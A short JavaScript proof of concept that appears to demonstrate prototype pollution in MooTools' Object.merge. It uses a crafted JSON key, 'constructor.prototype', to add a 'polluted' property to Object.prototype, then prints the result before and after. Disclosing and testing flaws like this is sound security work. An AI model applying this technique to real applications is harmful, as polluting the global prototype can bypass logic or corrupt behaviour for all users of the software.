var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
require('mootools');
console.log({}.polluted);
Object.merge(obj, JSON.parse('{"constructor.prototype": {"polluted":"yes"}}'));
console.log({}.polluted);